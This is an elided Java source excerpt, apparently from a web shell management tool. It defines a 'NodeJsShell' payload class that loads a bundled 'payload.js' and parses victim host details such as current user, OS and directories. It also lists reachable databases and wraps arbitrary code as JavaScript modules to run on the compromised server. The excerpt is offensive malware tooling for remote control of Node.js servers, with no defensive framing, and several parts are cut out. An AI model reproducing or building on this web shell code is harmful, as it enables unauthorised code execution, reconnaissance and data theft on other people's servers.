...
package shells.payloads.nodejs;
...
@PayloadAnnotation(
        Name = "NodeJsDynamicPayload"
)
public class NodeJsShell implements Payload {
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)";
    private static final String[] ALL_DATABASE_TYPE = new String[]{"mysql", "postgresql", "sqlite"};
    ...
    public boolean include(String codeName, byte[] binCode) {
        ...
        parameters.add("binCode", formatJsModule(binCode));
    ...
    public byte[] formatJsModule(byte[] js) {
        if (js != null && js.length > 0) {
            js = ("return " + new String(js)).getBytes();
        }
        return js;
    }
    ...
    public byte[] getPayload() {
        ...
        try {
            InputStream fileInputStream = NodeJsShell.class.getResourceAsStream("assets/payload.js");
